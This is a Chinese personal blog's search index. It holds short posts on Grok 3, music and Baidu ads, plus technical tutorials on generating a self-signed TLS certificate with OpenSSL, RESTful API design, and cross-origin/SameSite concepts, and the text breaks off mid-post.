<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>grok3确实很强</title>
    <link href="/2025/02/25/grok3%E7%A1%AE%E5%AE%9E%E5%BE%88%E5%BC%BA/"/>
    <url>/2025/02/25/grok3%E7%A1%AE%E5%AE%9E%E5%BE%88%E5%BC%BA/</url>
    
    <content type="html"><![CDATA[<p>用了下马斯克的grok3，感觉确实比ChatGPT4o要强一些<br>我问它一个关于HTTP(S)代理的问题，它真的能正确地分析并给出答案，而GPT4o只能乱分析</p>]]></content>
    
    
    <categories>
      
      <category>想法</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>救姻缘_黄安</title>
    <link href="/2025/02/17/%E6%95%91%E5%A7%BB%E7%BC%98-%E9%BB%84%E5%AE%89/"/>
    <url>/2025/02/17/%E6%95%91%E5%A7%BB%E7%BC%98-%E9%BB%84%E5%AE%89/</url>
    
    <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=95370&auto=1&height=66"></iframe><p>好听好听</p>]]></content>
    
    
    <categories>
      
      <category>音乐</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>各种报错解决方案</title>
    <link href="/2024/12/29/%E5%90%84%E7%A7%8D%E6%8A%A5%E9%94%99%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"/>
    <url>/2024/12/29/%E5%90%84%E7%A7%8D%E6%8A%A5%E9%94%99%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</url>
    
    <content type="html"><![CDATA[<p>此文章用于记录我在操作计算机过程中产生的各种类型的报错以及对应的解决方案，方便我在遇到同类型问题时进行查阅，同时希望帮助那些遇到同样问题的人</p><h2 id="一、"><a href="#一、" class="headerlink" title="一、"></a>一、</h2>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>为域名或IP生成自签名TLS证书</title>
    <link href="/2024/10/21/%E4%B8%BA%E5%9F%9F%E5%90%8D%E6%88%96IP%E7%94%9F%E6%88%90%E8%87%AA%E7%AD%BE%E5%90%8DTLS%E8%AF%81%E4%B9%A6/"/>
    <url>/2024/10/21/%E4%B8%BA%E5%9F%9F%E5%90%8D%E6%88%96IP%E7%94%9F%E6%88%90%E8%87%AA%E7%AD%BE%E5%90%8DTLS%E8%AF%81%E4%B9%A6/</url>
    
    <content type="html"><![CDATA[<p>我们这里用OpenSSL为域名或IP生成自签名TLS证书，linux上一般都预装了OpenSSL</p><h2 id="一、生成公私钥对"><a href="#一、生成公私钥对" class="headerlink" title="一、生成公私钥对"></a>一、生成公私钥对</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">openssl genpkey -algorithm RSA -out private.key -pkeyopt rsa_keygen_bits:2048<br></code></pre></td></tr></table></figure><p><code>genkey</code>openssl的子命令，用于生成公私密钥对</p><p><code>-algorithm RSA</code>指定公钥算法为RSA</p><p><code>-out private.key</code>指定输出文件名称，这里生成的private.key里面包含公钥和私</p><p><code>-pkeyopt rsa_keygen_bits:2048</code>指定RSA的模数n为2048bit，此数越大越安全</p><p>生成的private.key是PEM格式的</p><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/%E4%BD%BF%E7%94%A8OpenSSL%E7%94%9F%E6%88%90%E8%87%AA%E7%AD%BE%E5%90%8DTLS%E8%AF%81%E4%B9%A6/1.png"></p><p>&nbsp;</p><p>想要查看private.key中的公钥指数、私钥指数、模数等其它RSA相关参数，输入以下命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">openssl rsa -in private.key -text -noout<br></code></pre></td></tr></table></figure><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/%E4%BD%BF%E7%94%A8OpenSSL%E7%94%9F%E6%88%90%E8%87%AA%E7%AD%BE%E5%90%8DTLS%E8%AF%81%E4%B9%A6/2.png" alt="这里有一个图片"></p><h2 id="二、生成证书签名请求文件"><a href="#二、生成证书签名请求文件" class="headerlink" title="二、生成证书签名请求文件"></a>二、生成证书签名请求文件</h2><p>先创建一个SAN.cnf配置文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs shell">[ req ]<br>prompt = no<br>default_md = sha256    # 指定生成摘要的哈希算法 <br>req_extensions = req_ext<br>distinguished_name = dn<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">[ dn ]部分可自由发挥</span><br>[ dn ]<br>C = CN    # Country，国家，两个字符<br>ST = Shanghai    # Sate or Province，省份<br>L = Shanghai    # Locality，城市<br>O = Pasiphae Corporation    # Organization，组织<br>OU = security    # Organizational Unit，组织内的某个部门<br>CN = Pasiphae Corporation    # Common Name，通用名<br>emailAddress = pasiphae321@gmail.com    # 邮箱<br><br>[ req_ext ]<br>subjectAltName = @alt_names<br><br>[ alt_names ]<br><span class="hljs-meta prompt_"># </span><span class="language-bash">如果你是为域名创建证书，则取消注释掉下面的部分</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">DNS.1 = 你的域名</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">DNS.2 = 你的另一个域名</span><br>IP.1 = 192.168.163.105<br><span class="hljs-meta prompt_"># </span><span class="language-bash">IP.2 = 另一个IP输入以下命令生成证书签名请求文件</span><br></code></pre></td></tr></table></figure><p>&nbsp;</p><p>输入以下命令生成证书签名请求文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">openssl req -new -key private.key -out server.csr -config SAN.cnf<br></code></pre></td></tr></table></figure><p><code>req</code>openssl的子命令，用于生成证书签名请求文件，即Certificate Signing Request</p><p><code>-new</code>声明要创建新的证书签名请求</p><p><code>-key private.key</code>提供包含在证书签名请求文件中的公钥</p><p><code>-out server.csr</code>指定输出文件名称</p><p><code>-config SAN.cnf</code>指定此命令的配置文件</p><p>&nbsp;</p><p>生成的server.csr也是PEM格式，想要以人类可读的方式显示它，输入以下命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">openssl req -in server.csr -text -noout<br></code></pre></td></tr></table></figure><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/%E4%B8%BA%E5%9F%9F%E5%90%8D%E6%88%96IP%E7%94%9F%E6%88%90%E8%87%AA%E7%AD%BE%E5%90%8DTLS%E8%AF%81%E4%B9%A6/3.png" alt="这里有一个图片"></p><h2 id="三、生成自签名证书"><a href="#三、生成自签名证书" class="headerlink" title="三、生成自签名证书"></a>三、生成自签名证书</h2><p>X.509证书的结构如下</p><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/%E4%B8%BA%E5%9F%9F%E5%90%8D%E6%88%96IP%E7%94%9F%E6%88%90%E8%87%AA%E7%AD%BE%E5%90%8DTLS%E8%AF%81%E4%B9%A6/4.png" alt="这里有一个图片"></p><p>&nbsp;</p><p>输入以下命令生成自签名证书</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">openssl x509 -req -in server.csr -signkey private.key -out server.crt -days 365 -extfile SAN.cnf -extensions req_ext<br></code></pre></td></tr></table></figure><p><code>x509</code>声明要生成x509证书</p><p><code>-req</code>指定输入为证书签名请求文件</p><p><code>-in server.csr</code>指定输入文件</p><p><code>-signkey private.key</code>指定用于签名的私钥，因为是自签名，这里的私钥就是第一步生成的私钥</p><p><code>-out server.crt</code>指定输出文件名称</p><p><code>-days 365</code>指定证书365天后过期</p><p><code>-extfile SAN.cnf -extensions req_ext</code>指定配置文件</p><p>最终生成的证书文件也是PEM格式的</p><p>&nbsp;</p><p>我们输入以下命令，以人类可读的方式显示它</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">openssl x509 -in server.crt -text -noout<br></code></pre></td></tr></table></figure><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/%E4%B8%BA%E5%9F%9F%E5%90%8D%E6%88%96IP%E7%94%9F%E6%88%90%E8%87%AA%E7%AD%BE%E5%90%8DTLS%E8%AF%81%E4%B9%A6/5.png" alt="这里有一个图片"></p><p>我们可以看到，因为是自签名证书，issuer(证书颁发者)和subject(证书颁发对象)部分是完全一样的，其与前面的X.509证书结构相吻合</p><p>&nbsp;</p><p>我们深入了解下生成证书这个命令实际都干了什么呢?</p><p>其会先根据server.csr中的信息生成预证书(这是我起的名字，也就是证书中除了最后的签名的部分)，并对预证书进行哈希(哈希算法可指定，默认为sha256)生成摘要，并用私钥对摘要进行加密生成的密文即为数字签名，最后将其添加在预证书的末尾形成真正的证书</p><h2 id="四、验证自签名证书"><a href="#四、验证自签名证书" class="headerlink" title="四、验证自签名证书"></a>四、验证自签名证书</h2><p>我们将证书server.crt和私钥private.key部署到192.168.163.105上的nginx，并在192.168.163.1的浏览器访问<code>https://192.168.163.105/hello.html</code></p><p>因为是自签名证书，Chrome会如下发出警告</p><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/%E4%B8%BA%E5%9F%9F%E5%90%8D%E6%88%96IP%E7%94%9F%E6%88%90%E8%87%AA%E7%AD%BE%E5%90%8DTLS%E8%AF%81%E4%B9%A6/6.png" alt="这里有一个图片"></p><p>&nbsp;</p><p>我们查看下证书，其与我们的证书server.crt中的信息是一致的</p><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/%E4%B8%BA%E5%9F%9F%E5%90%8D%E6%88%96IP%E7%94%9F%E6%88%90%E8%87%AA%E7%AD%BE%E5%90%8DTLS%E8%AF%81%E4%B9%A6/7.png" alt="这里有一个图片"></p><p>&nbsp;</p><p>点击高级坚持访问网站，此时虽然浏览器的URL栏显示<code>不安全</code>和<del>https</del>，但其实数据传输是处于TLS加密下的，只是浏览器无法信任该证书</p><img title="" src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/%E4%B8%BA%E5%9F%9F%E5%90%8D%E6%88%96IP%E7%94%9F%E6%88%90%E8%87%AA%E7%AD%BE%E5%90%8DTLS%E8%AF%81%E4%B9%A6/8.png" alt="这里有一个图片" data-align="inline"><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/%E4%B8%BA%E5%9F%9F%E5%90%8D%E6%88%96IP%E7%94%9F%E6%88%90%E8%87%AA%E7%AD%BE%E5%90%8DTLS%E8%AF%81%E4%B9%A6/9.png" alt="这里有一个图片"></p><h2 id="五、让浏览器信任自签名证书"><a href="#五、让浏览器信任自签名证书" class="headerlink" title="五、让浏览器信任自签名证书"></a>五、让浏览器信任自签名证书</h2><p>操作系统会预置很多根证书颁发机构的根证书，浏览器信任的根证书都是从操作系统读取的</p><p>我们可以直接将自签名证书导入到操作系统的根证书列表里，这样电脑上的所有浏览器都会信任你的自签名证书，Chrome的URL栏的<code>不安全</code>和<del>https</del>就会消失</p><p>这里我以windows为例，将自签名证书导入操作系统根证书列表</p><p>win + r打开运行，输入certmgr.msc并回车，我们能看到所有的根证书</p><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/%E4%B8%BA%E5%9F%9F%E5%90%8D%E6%88%96IP%E7%94%9F%E6%88%90%E8%87%AA%E7%AD%BE%E5%90%8DTLS%E8%AF%81%E4%B9%A6/10.png" alt="这里有一个图片"></p><p>&nbsp;</p><p>我们右击证书，左击导入，然后根据指示导入server.crt</p><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/%E4%B8%BA%E5%9F%9F%E5%90%8D%E6%88%96IP%E7%94%9F%E6%88%90%E8%87%AA%E7%AD%BE%E5%90%8DTLS%E8%AF%81%E4%B9%A6/11.png" alt="这里有一个图片"></p><p>&nbsp;</p><p>导入成功后，能够在列表中找到你的自签名证书，其<code>颁发给</code>和<code>颁发者</code>都是你在SAN.cnf中填入的<code>Common Name</code></p><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/%E4%B8%BA%E5%9F%9F%E5%90%8D%E6%88%96IP%E7%94%9F%E6%88%90%E8%87%AA%E7%AD%BE%E5%90%8DTLS%E8%AF%81%E4%B9%A6/12.png" alt="这里有一个图片"></p><p>&nbsp;</p><p>此时我们重启Chrome，再次访问<code>https://192.168.163.105/hello.html</code></p><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/%E4%B8%BA%E5%9F%9F%E5%90%8D%E6%88%96IP%E7%94%9F%E6%88%90%E8%87%AA%E7%AD%BE%E5%90%8DTLS%E8%AF%81%E4%B9%A6/13.png" alt="这里有一个图片"></p><p>可以看到，URL栏的<code>不安全</code>和<del>https</del>消失了</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>nginx+frp+cloudreve搭建私人云盘</title>
    <link href="/2024/09/16/nginx-frp-cloudreve%E6%90%AD%E5%BB%BA%E7%A7%81%E4%BA%BA%E4%BA%91%E7%9B%98/"/>
    <url>/2024/09/16/nginx-frp-cloudreve%E6%90%AD%E5%BB%BA%E7%A7%81%E4%BA%BA%E4%BA%91%E7%9B%98/</url>
    
    <content type="html"><![CDATA[<h2 id="一、架构"><a href="#一、架构" class="headerlink" title="一、架构"></a>一、架构</h2><p>nginx在VPS上作反向代理</p><p>cloudreve运行在内网服务器上</p><p>frp用于实现内网穿透，连接VPS和内网服务器</p><h2 id="二、demo"><a href="#二、demo" class="headerlink" title="二、demo"></a>二、demo</h2><p><a href="https://14.103.157.111:33333/">嗣徽云盘</a></p><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/nginx%2Bfrp%2Bcloudreve%E6%90%AD%E5%BB%BA%E7%A7%81%E4%BA%BA%E4%BA%91%E7%9B%98/demo.png" alt="这里有一个图片"></p><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/nginx%2Bfrp%2Bcloudreve%E6%90%AD%E5%BB%BA%E7%A7%81%E4%BA%BA%E4%BA%91%E7%9B%98/demo2.png" alt="这里有一个图片"></p><h2 id="三、配置"><a href="#三、配置" class="headerlink" title="三、配置"></a>三、配置</h2><p>该部分修改中…</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>RESTful API详解</title>
    <link href="/2024/09/01/RESTful-API%E8%AF%A6%E8%A7%A3/"/>
    <url>/2024/09/01/RESTful-API%E8%AF%A6%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<p>RESTful API是基于REST架构风格构建的API，其设计遵循REST(Representational State Transfer，表现层状态转移)架构的一组原则和约束条件</p><p>RESTful API的核心思想是以资源为中心，通过统一的接口(通常是HTTP协议)进行通信，使客户端和服务器能够实现无状态的交互</p><h2 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h2><p>在RESTful API中，资源是web服务的核心，所有数据和功能都被视为资源。资源可以是任何事物，例如用户、订单、文件等</p><p>资源通过URI(统一资源标识符)来进行唯一标识。URI通常采用路径结构，指向具体的资源，例如</p><ul><li><p><code>GET /users</code>获取所有用户资源</p></li><li><p><code>GET /users/123</code>获取 ID 为 123 的具体用户</p></li><li><p><code>POST /users</code>创建新用户</p></li><li><p><code>PUT /users/123</code>更新 ID 为 123 的用户</p></li><li><p><code>DELETE /users/123</code>删除 ID 为 123 的用户</p></li></ul><h2 id="HTTP方法"><a href="#HTTP方法" class="headerlink" title="HTTP方法"></a>HTTP方法</h2><p>RESTful API通过标准的HTTP方法操作资源，这些方法代表了不同的操作语义</p><ul><li><p><code>GET</code>从服务器获取资源，此操作是只读的，不会改变服务器状态</p></li><li><p><code>POST</code>在服务器创建新资源</p></li><li><p><code>PUT</code>更新资源，可以是替换整个资源或创建资源</p></li><li><p><code>PATCH</code>局部更新资源，只修改资源的某一部分</p></li><li><p><code>DELETE</code>从服务器删除资源</p></li></ul><p>我们举几个例子</p><ul><li><p><code>GET /books</code>获取所有书籍</p></li><li><p><code>GET /books/5</code>获取 ID 为 5 的具体书籍</p></li><li><p><code>POST /books</code>创建新书籍</p></li><li><p><code>PUT /books/5</code>更新 ID 为 5 的书籍</p></li><li><p><code>DELETE /books/5</code>删除 ID 为 5 的书籍</p></li></ul><h2 id="HTTP状态码"><a href="#HTTP状态码" class="headerlink" title="HTTP状态码"></a>HTTP状态码</h2><p>RESTful API使用HTTP状态码向客户端反馈操作结果。常见的状态码包括</p><ul><li><p><code>200 OK</code>请求成功，返回资源或执行成功</p></li><li><p><code>201 Created:</code>资源创建成功，通常用于POST操作</p></li><li><p><code>204 No Content</code>操作成功但不返回内容，常用于DELETE请求</p></li><li><p><code>400 Bad Request</code>请求无效，客户端发送的数据格式或参数有误</p></li><li><p><code>401 Unauthorized</code>客户端未授权</p></li><li><p><code>403 Forbidden</code>客户端无权访问资源</p></li><li><p><code>404 Not Found</code>请求的资源不存在</p></li><li><p><code>500 Internal Server Error</code>服务器内部错误</p></li></ul><h2 id="路径设计"><a href="#路径设计" class="headerlink" title="路径设计"></a>路径设计</h2><p>RESTful API的路径设计应尽量清晰、简洁，并且语义明确。以下是一些路径设计的最佳实践</p><ul><li><p>使用名词表示资源:路径中不应包含动词，操作逻辑由HTTP方法决定</p></li><li><p>使用复数形式表示资源集合:例如，<code>/users</code>代表用户集合，<code>/users/123</code>代表具体用户</p></li><li><p>层次结构:URI 路径应体现资源之间的层次关系，例如:</p><ul><li><p><code>GET /users/123/posts</code>获取用户123的所有帖子</p></li><li><p><code>GET /users/123/posts/456</code>获取用户123的具体帖子456</p></li></ul></li></ul><h2 id="无状态性"><a href="#无状态性" class="headerlink" title="无状态性"></a>无状态性</h2><p>RESTful API遵循无状态性原则，即服务器不应在不同请求之间存储客户端的状态信息。每个请求都应该是独立的，并且包含处理该请求所需的所有信息，例如身份验证令牌等</p><p>这种设计简化了服务器端的实现，提高了系统的可扩展性</p><h2 id="使用JSON作为数据格式"><a href="#使用JSON作为数据格式" class="headerlink" title="使用JSON作为数据格式"></a>使用JSON作为数据格式</h2><p>虽然RESTful API并不强制使用特定的数据格式，但JSON是目前最流行的选择，因其简洁且易于解析</p><p>JSON格式的请求体，创建新用户</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;pasiphae&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;email&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;pasiphae321@gmail.com&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>响应体，获取用户</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;id&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">123</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;pasiphae&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;email&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;pasiphae321@gmail.com&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h2 id="缓存"><a href="#缓存" class="headerlink" title="缓存"></a>缓存</h2><p>RESTful API 支持缓存机制，以减少服务器负载并提高性能。服务器可以通过HTTP响应头(如Cache-Control)指示客户端是否可以缓存响应</p><p>GET请求通常可以通过缓存优化，而POST、PUT、DELETE等请求则不应该缓存</p><h2 id="版本控制"><a href="#版本控制" class="headerlink" title="版本控制"></a>版本控制</h2><p>API在迭代过程中可能会引入不兼容的变更，因此需要对API进行版本控制。常见的版本控制方式包括</p><ul><li><p>URI中的版本号:例如&#x2F;v1&#x2F;users</p></li><li><p>HTTP头中的版本号:例如在Accept头中指定版本号</p></li><li><p>查询参数中的版本号:例如GET &#x2F;users?version&#x3D;1</p></li></ul><h2 id="错误处理"><a href="#错误处理" class="headerlink" title="错误处理"></a>错误处理</h2><p>当请求失败时，RESTful API应返回明确的错误信息和相应的HTTP状态码，以便客户端理解错误原因，错误信息应包含足够的细节，下面是一个响应体例子</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;error&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Bad Request&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;message&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;User ID must be a positive integer.&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h2 id="HATEOAS-超媒体即应用状态引擎"><a href="#HATEOAS-超媒体即应用状态引擎" class="headerlink" title="HATEOAS(超媒体即应用状态引擎)"></a>HATEOAS(超媒体即应用状态引擎)</h2><p>RESTful API的一个可选特性是HATEOAS</p><p>它规定服务器应在响应中提供相关资源的链接，以便客户端可以发现和导航 API 的其他部分，HATEOAS使API更加自描述</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;id&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">123</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;pasiphae&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;_links&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;self&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span> <span class="hljs-attr">&quot;href&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;/users/123&quot;</span> <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;friends&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span> <span class="hljs-attr">&quot;href&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;/users/123/friends&quot;</span> <span class="hljs-punctuation">&#125;</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h2 id="安全性"><a href="#安全性" class="headerlink" title="安全性"></a>安全性</h2><p>RESTful API的安全性至关重要，特别是在生产环境中。常见的安全措施包括</p><ul><li><p>HTTPS:所有通信应通过HTTPS进行加密</p></li><li><p>身份验证:通常使用令牌(如 JWT)或OAuth进行用户身份验证</p></li><li><p>权限控制:确保用户仅能访问自己有权访问的资源</p></li></ul><h2 id="分页、排序、过滤"><a href="#分页、排序、过滤" class="headerlink" title="分页、排序、过滤"></a>分页、排序、过滤</h2><p>对于大数据集，RESTful API通常需要提供分页、排序和过滤功能</p><p>分页通常通过查询参数来实现</p><ul><li><p><code>GET /users?page=2&amp;limit=50</code>获取第 2 页，每页 50 个用户</p></li><li><p><code>GET /users?sort=name&amp;order=asc</code>按名称升序排序</p></li><li><p><code>GET /users?role=admin</code>只获取管理员用户</p></li></ul><h2 id="RESTful-API设计的关键原则"><a href="#RESTful-API设计的关键原则" class="headerlink" title="RESTful API设计的关键原则"></a>RESTful API设计的关键原则</h2><ul><li><p>表现层状态转移:客户端通过操作资源的表现层(通常是JSON或XML数据)来管理资源的状态</p></li><li><p>统一接口:通过简单、固定的HTTP方法和标准化的资源URI进行操作</p></li><li><p>无状态性:请求独立，服务器不保留会话状态</p></li><li><p>可缓存性:合理设置缓存机制以提高性能</p></li><li><p>分层系统:客户端无需知道服务器的具体实现，可以通过中间层(如负载均衡、缓存代理)提高可扩展性</p></li></ul><p>&nbsp;</p><p>本文参考的文章</p><p><a href="https://zh.wikipedia.org/wiki/%E8%A1%A8%E7%8E%B0%E5%B1%82%E7%8A%B6%E6%80%81%E8%BD%AC%E6%8D%A2">表现层状态转移</a></p><p><a href="https://www.ruanyifeng.com/blog/2014/05/restful_api.html">RESTful API 设计指南</a></p><p><a href="https://www.redhat.com/en/topics/api/what-is-a-rest-api">What is a REST API?</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>垃圾百度</title>
    <link href="/2024/05/11/%E5%9E%83%E5%9C%BE%E7%99%BE%E5%BA%A6/"/>
    <url>/2024/05/11/%E5%9E%83%E5%9C%BE%E7%99%BE%E5%BA%A6/</url>
    
    <content type="html"><![CDATA[<p>好久没用百度了，今天偶然用了一下，前五条都是广告<br>当然打广告无可厚非，但tm一整页正文部分都是广告，吃相太难看了<br>百度日渐衰落不是没原因的</p>]]></content>
    
    
    <categories>
      
      <category>想法</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>跨源与跨站、CORS、Cookie的SameSite属性详解</title>
    <link href="/2024/02/03/%E8%B7%A8%E7%AB%99%E4%B8%8E%E8%B7%A8%E6%BA%90%E3%80%81CORS%E3%80%81Cookie%E7%9A%84SameSite%E5%B1%9E%E6%80%A7%E6%B5%85%E6%9E%90/"/>
    <url>/2024/02/03/%E8%B7%A8%E7%AB%99%E4%B8%8E%E8%B7%A8%E6%BA%90%E3%80%81CORS%E3%80%81Cookie%E7%9A%84SameSite%E5%B1%9E%E6%80%A7%E6%B5%85%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h2 id="一、跨源与跨站"><a href="#一、跨源与跨站" class="headerlink" title="一、跨源与跨站"></a>一、跨源与跨站</h2><p>四个概念</p><ul><li>同源same origin</li><li>跨源cross origin</li><li>同站same site</li><li>跨站cross site</li></ul><p>首先我们要清楚，跨源和跨站(同源和同站)不是一个概念，跨源是<strong>cross origin</strong>，跨站是<strong>cross site</strong>。但其实，这两者是子集的关系，跨站了就必定跨源了，但跨源不一定跨站</p><p>1.同源、跨源<br>同源的要求很严格，两个URL必须<strong>协议、域名、端口</strong>都相同才会算作同源，否则为跨源<br>假设有一个URL<code>http://test.pasiphae321.top/about/mercury.html</code>，下表是对相关URL是否与其同源的判断</p><table><thead><tr><th>URL</th><th>是否同源</th><th>原因</th></tr></thead><tbody><tr><td>ftp:&#x2F;&#x2F;test.pasiphae321.top&#x2F;about&#x2F;mercury.html</td><td>不同源</td><td>协议不同</td></tr><tr><td><a href="https://test.pasiphae321.top/about/mercury.html">https://test.pasiphae321.top/about/mercury.html</a></td><td>不同源</td><td>协议不同</td></tr><tr><td><a href="http://attempt.pasiphae321.top/about/mercury.html">http://attempt.pasiphae321.top/about/mercury.html</a></td><td>不同源</td><td>域名不同</td></tr><tr><td><a href="http://test.pasiphae321.top:8080/about/mercury.html">http://test.pasiphae321.top:8080/about/mercury.html</a></td><td>不同源</td><td>端口不同</td></tr><tr><td><a href="http://test.pasiphae321.top/post/venus.html">http://test.pasiphae321.top/post/venus.html</a></td><td>同源</td><td>只有路径不同</td></tr></tbody></table><p>关于同源策略的文档见<a href="https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy">https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy</a></p><p>2.同站、跨站<br>同站的要求较为宽松，只要URL的域名的<strong>公共后缀+1</strong>相同就属于同站，否则为跨站<br>**公共后缀(public suffix)**指的是个人、公司、组织能在其上注册子域的域，如<code>com、net、cn、github.io、com.cn、com.ac</code>等，所有的公共后缀见由mozilla的志愿者维护的<a href="https://publicsuffix.org/list/public_suffix_list.dat">公共后缀列表(public suffix list)</a><br>了解更多关于公共后缀的信息，见<a href="https://publicsuffix.org/learn/">https://publicsuffix.org/learn/</a></p><p>例如，<code>www.pasiphae321.top</code>和<code>ftp.pasiphae321.top</code>，这两个域名对应的公共后缀就是<code>top</code>，公共后缀+1均为<code>pasiphae321.top</code>，所以属于同站</p><p>3.简单跨源请求、非简单跨源请求<br>(1)跨源请求<br>在一个HTML文件里，假设有</p><ul><li><code>img、link、video、audio、script</code>等标签发起的</li><li>javascript里XMLHttpRequest发起的</li><li>用户主动点击链接、提交表单发起的</li><li>fetch API发起的</li></ul><p>和当前网页URL不同源的请求，就是跨源请求</p><p>更多关于跨源请求的详细信息见<a 